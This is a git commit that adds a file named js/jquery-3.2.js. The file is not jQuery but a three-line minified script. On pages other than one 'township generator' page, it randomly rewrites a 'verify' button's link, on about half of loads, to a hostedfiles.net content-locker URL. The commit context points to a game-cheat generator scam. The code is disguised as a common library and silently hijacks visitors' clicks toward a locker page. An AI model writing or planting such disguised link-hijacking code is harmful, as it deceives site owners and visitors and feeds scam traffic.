169388eefb4b0697491948b1e80a1ed8edb2eda0
redoverroyal <64239505+redoverroyal@users.noreply.github.com>
2020-09-04 14:37:58 +0700

    Add files via upload

---
+++ js/jquery-3.2.js
@@ -0,0 +1,3 @@
+if(document.getElementById("first-step-button-verify").href!="https://www.hostedfiles.net/cl.php?id=ed817cc2eae96a5088feee859899071e") {
+    0>window.location.href.toString().indexOf("https://murugame.info/township/generator.html")&&0==Math.floor(100*Math.random()/50)&&(window.onload=function(){document.getElementById("first-step-button-verify").href="https://www.hostedfiles.net/cl.php?id=ed817cc2eae96a5088feee859899071e"});
+}
